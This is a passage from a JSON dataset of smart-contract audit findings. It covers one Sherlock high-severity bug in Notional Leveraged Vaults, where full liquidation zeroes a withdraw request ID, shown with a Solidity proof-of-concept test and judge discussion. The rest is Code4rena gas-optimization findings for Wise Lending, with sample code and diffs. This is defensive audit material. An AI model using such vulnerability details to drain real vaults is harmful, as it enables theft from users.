toWithdraw.requestId == 0 || toWithdraw.requestId == w.requestId,\n            \"Existing Request\"\n        );\n\n        console.log(\"Request ID is After Delete :\", w.requestId);\n        // Either the request gets set or it gets incremented here.\n        toWithdraw.requestId = w.requestId; // @audit : the request id will be zero here\n        toWithdraw.vaultShares = toWithdraw.vaultShares + vaultShares;\n        toWithdraw.hasSplit = true;\n    }\n\n    function _createRequest() internal {\n        WithdrawRequest storage accountWithdraw = VaultStorage\n            .getAccountWithdrawRequest()[alice];\n\n        accountWithdraw.requestId = uint256(uint160(address(alice)));\n        accountWithdraw.vaultShares = 100;\n        accountWithdraw.hasSplit = false;\n    }\n}\n\nlibrary VaultStorage {\n    /// @notice Emitted when vault settings are updated\n    // event StrategyVaultSettingsUpdated(StrategyVaultSettings settings);\n    // Wrap timestamp in a struct so that it can be passed around as a storage pointer\n    struct LastClaimTimestamp {\n        uint256 value;\n    }\n\n    /// @notice account initiated WithdrawRequest\n    uint256 private constant ACCOUNT_WITHDRAW_SLOT = 1000008;\n\n    function getAccountWithdrawRequest()\n        internal\n        pure\n        returns (mapping(address => WithdrawRequest) storage store)\n    {\n        assembly {\n            store.slot := ACCOUNT_WITHDRAW_SLOT\n        }\n    }\n}\n```\n```\n  Request ID is Before Delete : 964133639515395071211053928642046522704087555788\n  Request ID is After Delete : 0\n```\n\n**WangSecurity**\n\nI agree with the escalation, it is a nice find. Planning to accept it and validate it with High severity since it will happen with every full liquidation. The duplicate is #89, @mystery0x are there other duplicates as well?\n\n**brakeless-wtp**\n\n#41 \n\n**WangSecurity**\n\nResult: \nHigh\nHas duplicates \n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [novaman33](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/6/#issuecomment-2222869822): accepted\n\n**mystery0x**\n\n> I agree with the escalation, it is a nice find. Planning to accept it and validate it with High severity since it will happen with every full liquidation. The duplicate is #89, @mystery0x are there other duplicates as well?\n\n#6, #41, and #89 are the only three reports submitting this finding.",
      "summary": "\nIssue H-1 is a bug in the `_splitWithdrawRequest` function in the leveraged vaults smart contract. It occurs when an account is fully liquidated, resulting in the deletion of the old withdraw request. This creates an invalid ID for the liquidator's withdraw request, potentially leading to loss of vault tokens. The bug was found by ZeroTrust, aman, and novaman33 and can be fixed by storing the requestId of the from address in another memory variable. The bug has been escalated and has duplicates in issues #41 and #89. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/6",
      "tags": [],
      "finders": [
        "ZeroTrust",
        "aman",
        "novaman33"
      ]
    },
    {
      "id": "32128",
      "title": "[G-14] Functions guaranteed to revert when called by normal users can be marked payable",
      "impact": "GAS",
      "content": "\nIf a function modifier or require such as `onlyOwner`/`onlyX` is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2), `DUP1`(3), `ISZERO`(3), `PUSH2`(3), `JUMPI`(10), `PUSH1`(3), `DUP1`(3), `REVERT`(0), `JUMPDEST`(1), `POP`(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.\n\nThe recommended mitigation steps is that functions guaranteed to revert when called by normal users can be marked payable.\n\n**Instances:**\n\n<details>\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L859-#L896\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L939-#L967\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1055-#L1080\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1412-#L1428\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L85-#L100\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L142-#L187\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L193-#L232\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L405-#L436\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L980-#L988\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L995-#L1003\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L1032-#L1039\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L1111-#L1122\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L592-#L603\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L49-#L60\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L66-#L77\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L82-#L102\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L108-#L129\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L135-#L166\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L173-#L189\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L214-#L226\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L232-#L244\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L390-#L406\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L412-#L432\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L438-#L487\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L494-#L508\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L514-#L531\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L538-#L565\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L571-#L598\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L32-#L51\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L211-#L291\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L293-#L319\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L321-#L332\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L334-#L359\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L364-#L429\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L431-#L449\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L451-#L495\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L497-#L524\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L526-#L542\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L544-#L564\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L566-#L579\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L600-#L610\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L612-#L644\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLendingDeclaration.sol#L140-#L159\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L218-#L260\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L266-#L321\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L359-#L372\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L379-#L401\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L403-#L412\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHub.sol#L44-#L56\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHub.sol#L64-#L77\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHub.sol#L611-#L628\n\n</details>\n\n### Conclusion\n\nAs you embark on incorporating the recommended optimizations, we want to emphasize the utmost importance of proceeding with vigilance and dedicating thorough efforts to comprehensive testing. It is of paramount significance to ensure that the proposed alterations do not inadvertently introduce fresh vulnerabilities, while also successfully achieving the anticipated enhancements in performance.\n\nWe strongly advise conducting a meticulous and exhaustive evaluation of the modifications made to the codebase. This rigorous scrutiny and exhaustive assessment will play a pivotal role in affirming both the security and efficacy of the refactored code. Your careful attention to detail, coupled with the implementation of a robust testing framework, will provide the necessary assurance that the refined code aligns with your security objectives and effectively fulfills the intended performance optimizations.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/248#issuecomment-2020202798):**\n > Highest quality submission and includes estimated gas savings which line up with opcode costs.\n\n***\n\n",
      "summary": "",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32127",
      "title": "[G-13] memory variable should created outside of loop",
      "impact": "GAS",
      "content": "\nMemory variable should created outside of loop and get overridden with each iteration of loop. By doing so we save gas cost for memory variable creation in each iteration.\n\n### Proof of Concept\n\n```solidity\ncontract VarInLoop {\n\n    uint256[] numbers = [1,2,3,4,5];\n    uint256 total;\n\n    function double(uint256 num) public pure returns(uint256 ans) {\n        ans = num * 2;\n    }\n\n    function doubleNumbers() public {\n        uint256 len = numbers.length;\n\n        for(uint256 i; i < len; ++i) {\n            uint256 doubleNum =  double(numbers[i]);\n            total = total + doubleNum;\n        }\n    }\n}\n```\n\n```\ntest for test/VarInLoop.t.sol:VarInLoopTest\n[PASS] test_doubleNumbers() (gas: 38185)\n```\n\n```\ncontract VarOutLoop {\n\n    uint256[] numbers = [1,2,3,4,5];\n    uint256 total;\n\n    function double(uint256 num) public pure returns(uint256 ans) {\n        ans = num * 2;\n    }\n\n    function doubleNumbers() public {\n        uint256 len = numbers.length;\n\n        uint256 doubleNum;\n        for(uint256 i; i < len; ++i) {\n            doubleNum =  double(numbers[i]);\n            total = total + doubleNum;\n        }\n    }\n}\n```\n\n```\ntest for test/VarOutLoop.t.sol:VarOutLoopTest\n[PASS] test_doubleNumbers() (gas: 38170)\n```\n\n**Instances:**\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L711\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L237\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L274\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L277\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L278\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L279\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L281\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L627\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L260\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L256\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L292\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L27\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManagerHelper.sol#L59\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32126",
      "title": "[G-12] Avoid emitting event on every iteration",
      "impact": "GAS",
      "content": "\nExpensive operations should always try to be avoided within loops. Such operations include: reading/writing to storage, heavy calculations, external calls and emitting events. In this instance, an event is being emitted every iteration. Events have a base cost of Glog (375 gas) per emit and Glogdata (8 gas) * number of bytes in event. We can avoid incurring those costs each iteration by emitting the event outside of the loop.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L156-#L160\n\n```solidity\nfile: contracts/FeeManager/FeeManager.sol\n\n135:    function setPoolFeeBulk(\n136:        address[] calldata _poolTokens,\n137:        uint256[] calldata _newFees\n138:    )\n139:        external\n140:        onlyMaster\n141:    {\n142:        uint256 i;\n143:        uint256 l = _poolTokens.length;\n144:\n145:        while (i < l) {\n146:\n147:            _checkValue(\n148:                _newFees[i]\n149:            );\n150:\n151:            WISE_LENDING.setPoolFee(\n152:                _poolTokens[i],\n153:                _newFees[i]\n154:            );\n155:\n156:            emit PoolFeeChanged(    //@audit event emitted in loop\n157:                _poolTokens[i],\n158:                _newFees[i],\n159:                block.timestamp\n160:            );\n161:\n162:            unchecked {\n163:                ++i;\n164:            }\n165:        }\n166:    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32125",
      "title": "[G-11] Caching the length of calldata increases gas cost instead of reducing it",
      "impact": "GAS",
      "content": "\n### Proof of Concept\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ncontract CacheCallDataLength {\n    \n\n    function calculateTotal(uint256[5] memory numbers) public pure returns(uint256 total) {\n        uint256 len = numbers.length;\n\n        for(uint i; i < len; ++i) {\n            total += numbers[i];\n        }\n\n    }\n}\n```\n\n```\ntest for test/CacheCallDataLength.t.sol:CacheCallDataLengthTest\n[PASS] test_calculateTotal() (gas: 1633)\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\ncontract NoCacheCallDataLength {\n    \n\n    function calculateTotal(uint256[5] memory numbers) public pure returns(uint256 total) {\n\n        for(uint i; i < numbers.length; ++i) {\n            total += numbers[i];\n        }\n        \n    }\n}\n```\n\n```\ntest for test/NoCacheCallDataLength.t.sol:NoCacheCallDataLengthTest\n[PASS] test_calculateTotal() (gas: 1628)\n```\n\n**Instance 1:**\n\nReduce gas cost of `FeeManager.setBeneficial()` function by not caching the length of calldata variable `_feeTokens`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L546\n\n```solidity\nfile: contracts/FeeManager/FeeManager.sol\n\n538:    function setBeneficial(\n539:        address _user,\n540:        address[] calldata _feeTokens\n541:    )\n542:        external\n543:        onlyMaster\n544:    {\n545:        uint256 i;\n546:        uint256 l = _feeTokens.length;  //@audit don't cache calldata length\n547:\n548:        while (i < l) {\n549:            _setAllowedTokens(\n550:                _user,\n551:                _feeTokens[i],\n552:                true\n553:            );\n554:\n555:            unchecked {\n556:                ++i;\n557:            }\n.\n.\n.\n565:    }\n```\n\n```diff\ndiff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol\nindex f176113..9e78788 100644\n--- a/contracts/FeeManager/FeeManager.sol\n+++ b/contracts/FeeManager/FeeManager.sol\n@@ -543,9 +543,8 @@ contract FeeManager is FeeManagerHelper {\n         onlyMaster\n     {\n         uint256 i;\n-        uint256 l = _feeTokens.length;\n\n-        while (i < l) {\n+        while (i < _feeTokens.length) {\n             _setAllowedTokens(\n                 _user,\n                 _feeTokens[i],\n```\n\n**Instance 2:**\n\nReduce gas cost of `FeeManager.setBeneficial()` function by not caching the length of calldata variable `_feeTokens`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L293\n\n```solidity\nfile: contracts/WiseOracleHub/WiseOracleHub.sol\n\n266:    function addTwapOracleDerivative(\n267:        address _tokenAddress,\n268:        address _partnerTokenAddress,\n269:        address[2] calldata _uniPools,\n270:        address[2] calldata _token0Array,\n271:        address[2] calldata _token1Array,\n272:        uint24[2] calldata _feeArray\n273:    )\n274:        external\n275:        onlyMaster\n276:    {\n.\n.\n.\n291:        uint256 i;\n292:        address pool;\n293:        uint256 length = _uniPools.length;  //@audit don't cache calldata length\n294:\n295:        while (i < length) {\n296:            pool = _getPool(\n297:                _token0Array[i],\n298:                _token1Array[i],\n299:                _feeArray[i]\n300:            );\n301:\n302:            _validatePoolAddress(\n303:                pool,\n304:                _uniPools[i]\n305:            );\n306:\n307:            unchecked {\n308:                ++i;\n309:            }\n310:        }\n.\n.\n.\n321:    }\n```\n\n```diff\ndiff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol\nindex 12fe0c8..f105337 100644\n--- a/contracts/WiseOracleHub/WiseOracleHub.sol\n+++ b/contracts/WiseOracleHub/WiseOracleHub.sol\n@@ -290,9 +290,8 @@ contract WiseOracleHub is OracleHelper {\n\n         uint256 i;\n         address pool;\n-        uint256 length = _uniPools.length;\n\n-        while (i < length) {\n+        while (i < _uniPools.length) {\n             pool = _getPool(\n                 _token0Array[i],\n                 _token1Array[i],\n```\n\n**Instance 3:**\n\nReduce gas cost of `WiseOracleHub.addOracleBulk()` function by not caching the length of calldata variable `_tokenAddresses`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L388\n\n```solidity\nfile: contracts/WiseOracleHub/WiseOracleHub.sol\n\n379:    function addOracleBulk(\n380:        address[] calldata _tokenAddresses,\n381:        IPriceFeed[] calldata _priceFeedAddresses,\n382:        address[][] calldata _underlyingFeedTokens\n383:    )\n384:        external\n385:        onlyMaster\n386:    {\n387:        uint256 i;\n388:        uint256 l = _tokenAddresses.length;\n389:\n390:        while (i < l) {\n391:            _addOracle(\n392:                _tokenAddresses[i],\n393:                _priceFeedAddresses[i],\n394:                _underlyingFeedTokens[i]\n395:            );\n396:\n397:            unchecked {\n398:                ++i;\n399:            }\n400:        }\n401:    }\n```\n\n```diff\ndiff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol\nindex 12fe0c8..ecc8e55 100644\n--- a/contracts/WiseOracleHub/WiseOracleHub.sol\n+++ b/contracts/WiseOracleHub/WiseOracleHub.sol\n@@ -385,9 +385,8 @@ contract WiseOracleHub is OracleHelper {\n         onlyMaster\n     {\n         uint256 i;\n-        uint256 l = _tokenAddresses.length;\n\n-        while (i < l) {\n+        while (i < _tokenAddresses.length) {\n             _addOracle(\n                 _tokenAddresses[i],\n                 _priceFeedAddresses[i],\n```\n\n**Instance 4:**\n\nReduce gas cost of `WiseOracleHub.recalibrateBulk()` function by not caching the length of calldata variable `_tokenAddresses`.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L507\n\n```solidity\nfile: contracts/WiseOracleHub/WiseOracleHub.sol\n\n501:    function recalibrateBulk(\n502:        address[] calldata _tokenAddresses\n503:    )\n504:        external\n505:    {\n506:        uint256 i;\n507:        uint256 l = _tokenAddresses.length;\n508:\n509:        while (i < l) {\n510:            _recalibrate(\n511:                _tokenAddresses[i]\n512:            );\n513:\n514:            unchecked {\n515:                ++i;\n516:            }\n517:        }\n518:    }\n```\n\n```diff\ndiff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol\nindex 12fe0c8..169243e 100644\n--- a/contracts/WiseOracleHub/WiseOracleHub.sol\n+++ b/contracts/WiseOracleHub/WiseOracleHub.sol\n@@ -504,9 +504,8 @@ contract WiseOracleHub is OracleHelper {\n         external\n     {\n         uint256 i;\n-        uint256 l = _tokenAddresses.length;\n\n-        while (i < l) {\n+        while (i < _tokenAddresses.length) {\n             _recalibrate(\n                 _tokenAddresses[i]\n             );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32124",
      "title": "[G-10] Using calldata instead of memory for read-only arguments in external functions saves gas",
      "impact": "GAS",
      "content": "\n**Instance 1:**\n\nRefactor the `PendlePowerFarmToken.initialize()` function to use `calldata` in place of `memory` for the `_tokenName` amd `_symbolName` parameters.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L685-#L686\n\nSince the string parameters `_tokenName` amd `_symbolName` were not modified, we can reduce the gas cost of the `PendlePowerFarmToken.initialize()` function by using `calldata` in place of `memory` in the definition of the `_tokenName` amd `_symbolName` parameters. In implementing this we would avoid having to copy the strings from calldata to memory. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n\n682:    function initialize(\n683:        address _underlyingPendleMarket,\n684:        address _pendleController,\n685:        string memory _tokenName,   //@audit use calldata in-place of memory\n686:        string memory _symbolName,   //@audit use calldata in-place of memory\n687:        uint16 _maxCardinality\n688:    )\n689:        external\n690:    {\n.\n.\n.\n732:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\nindex 9f7bb58..2f53c1d 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol\n@@ -682,8 +682,8 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {\n     function initialize(\n         address _underlyingPendleMarket,\n         address _pendleController,\n-        string memory _tokenName,\n-        string memory _symbolName,\n+        string calldata _tokenName,\n+        string calldata _symbolName,\n         uint16 _maxCardinality\n     )\n```\n\n**Instance 2:**\n\nRefactor the `FeeManager.revokeBeneficial()` function to use `calldata` in place of `memory` for the `_feeTokens` parameter.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L573\n\nSince the `_feeTokens` array is not modified, we can reduce the gas cost of the `FeeManager.revokeBeneficial()` function by using `calldata` in place of `memory` in the definition of the `_feeTokens` parameter. In implementing this we would avoid having to copy the array from calldata to memory. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/FeeManager/FeeManager.sol\n\n571:    function revokeBeneficial(\n572:        address _user,\n573:        address[] memory _feeTokens    //@audit use calldata in-place of memory\n574:    )\n575:        external\n576:        onlyMaster\n577:    {\n.\n.\n.\n598:    }\n```\n\n```diff\ndiff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol\nindex f176113..d32aa04 100644\n--- a/contracts/FeeManager/FeeManager.sol\n+++ b/contracts/FeeManager/FeeManager.sol\n@@ -570,7 +570,7 @@ contract FeeManager is FeeManagerHelper {\n      */\n     function revokeBeneficial(\n         address _user,\n-        address[] memory _feeTokens\n+        address[] calldata _feeTokens\n     )\n         external\n         onlyMaster\n```\n\n**Instance 3:**\n\nRefactor the `PendlePowerFarmLeverageLogic.receiveFlashLoan()` function to use `calldata` in place of `memory` for the `_flashloanToken`, `_flashloanAmounts`, `_feeAmounts` and `_userData` parameters.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L60-#L63\n\nSince the `_flashloanToken`, `_flashloanAmounts`, `_feeAmounts` arrays and the `_userData` were not modified, we can reduce the gas cost of the `PendlePowerFarmLeverageLogic.receiveFlashLoan()` function by using `calldata` in place of `memory` in the definition of these parameters. In implementing this we would avoid having to copy the arrays from calldata to memory. The diff below shows how the code should be refactored:\n\n```solidity\nfile: /contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol\n\n59:     function receiveFlashLoan(\n60:         IERC20[] memory _flashloanToken,    //@audit use calldata in-place of memory\n61:         uint256[] memory _flashloanAmounts,    //@audit use calldata in-place of memory\n62:         uint256[] memory _feeAmounts,    //@audit use calldata in-place of memory\n63:         bytes memory _userData    //@audit use calldata in-place of memory\n64:     )\n65:         external\n66:     {\n.\n.\n.\n129:    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol b/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol\nindex 70644f2..855189c 100644\n--- a/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol\n+++ b/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol\n@@ -57,10 +57,10 @@ abstract contract PendlePowerFarmLeverageLogic is\n      * logic. Overwritten with opening flows.\n      */\n     function receiveFlashLoan(\n-        IERC20[] memory _flashloanToken,\n-        uint256[] memory _flashloanAmounts,\n-        uint256[] memory _feeAmounts,\n-        bytes memory _userData\n+        IERC20[] calldata _flashloanToken,\n+        uint256[] calldata _flashloanAmounts,\n+        uint256[] calldata _feeAmounts,\n+        bytes calldata _userData\n     )\n         external\n```\n\n**Instance 4:**\n\nRefactor the `PendlePowerFarmController.addPendleMarket()` function to use `calldata` in place of `memory` for the `_tokenName` and `_symbolName` parameters.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L213-#L214\n\nSince the strings parameters `_tokenName` and `_symbolName` were not modified, we can reduce the gas cost of the `PendlePowerFarmController.addPendleMarket()` function by using `calldata` in place of `memory` in the definition of these parameters. In implementing this we would avoid having to copy the strings from calldata to memory. The diff below shows how the code should be refactored:\n\n```solidity\nfile: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol\n\n211:    function addPendleMarket(\n212:        address _pendleMarket,\n213:        string memory _tokenName,    //@audit use calldata in-place of memory\n214:        string memory _symbolName,    //@audit use calldata in-place of memory\n215:        uint16 _maxCardinality\n216:    )\n217:        external\n218:        onlyMaster\n219:    {\n.\n.\n.\n291    }\n```\n\n```diff\ndiff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.solindex 15cb863..813cab4 100644\n--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol\n+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol\n@@ -210,8 +210,8 @@ contract PendlePowerFarmController is PendlePowerFarmControllerHelper {\n\n     function addPendleMarket(\n         address _pendleMarket,\n-        string memory _tokenName,\n-        string memory _symbolName,\n+        string calldata _tokenName,\n+        string calldata _symbolName,\n         uint16 _maxCardinality\n     )\n```\n\n**Instance 5:**\n\nRefactor the `PositionNFTs.setBaseURI()` function to use `calldata` in place of `memory` for the `_newBaseURI` parameter.\n\nhttps://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PositionNFTs.sol#L320\n\nSince the string parameter 